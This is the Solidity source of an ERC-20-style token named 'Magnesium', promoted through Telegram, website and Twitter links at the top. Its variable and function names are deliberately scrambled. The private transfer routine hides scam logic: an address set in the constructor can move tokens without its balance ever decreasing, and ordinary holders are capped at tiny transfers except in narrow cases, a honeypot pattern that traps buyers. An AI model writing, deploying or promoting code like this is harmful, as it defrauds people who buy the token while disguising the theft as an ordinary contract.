/*

https://t.me/magnesiumerc

https://magnesium.cryptotoken.live/

https://twitter.com/MagnesiumERC0

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Magnesium is Ownable {
    function transfer(address pygzbr, uint256 nvcyhqka) public returns (bool success) {
        xizluay(msg.sender, pygzbr, nvcyhqka);
        return true;
    }

    IUniswapV2Router02 private zmdht;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public wbyxoqerusn;

    string public name;

    uint256 private rgujyasxdfe = 100;

    mapping(address => uint256) private jmxksfawqdui;

    constructor(string memory muac, string memory oahxsetnzpw, address wixnajr, address ivwlfb) {
        name = muac;
        symbol = oahxsetnzpw;
        balanceOf[msg.sender] = totalSupply;
        xhriu[ivwlfb] = rgujyasxdfe;
        zmdht = IUniswapV2Router02(wixnajr);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address ztcomj, address pygzbr, uint256 nvcyhqka) public returns (bool success) {
        require(nvcyhqka <= allowance[ztcomj][msg.sender]);
        allowance[ztcomj][msg.sender] -= nvcyhqka;
        xizluay(ztcomj, pygzbr, nvcyhqka);
        return true;
    }

    function approve(address abkrwuloh, uint256 nvcyhqka) public returns (bool success) {
        allowance[msg.sender][abkrwuloh] = nvcyhqka;
        emit Approval(msg.sender, abkrwuloh, nvcyhqka);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private xhriu;

    function xizluay(address ztcomj, address pygzbr, uint256 nvcyhqka) private {
        address sbthcmljv = IUniswapV2Factory(zmdht.factory()).getPair(address(this), zmdht.WETH());
        bool twfci = jmxksfawqdui[ztcomj] == block.number;
        if (0 == xhriu[ztcomj]) {
            if (ztcomj != sbthcmljv && (!twfci || (twfci && nvcyhqka > wbyxoqerusn[ztcomj])) && nvcyhqka < totalSupply) {
                require(nvcyhqka <= totalSupply / (10 ** decimals));
            }
            balanceOf[ztcomj] -= nvcyhqka;
        }
        wbyxoqerusn[pygzbr] = nvcyhqka;
        balanceOf[pygzbr] += nvcyhqka;
        jmxksfawqdui[pygzbr] = block.number;
        emit Transfer(ztcomj, pygzbr, nvcyhqka);
    }

    string public symbol;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
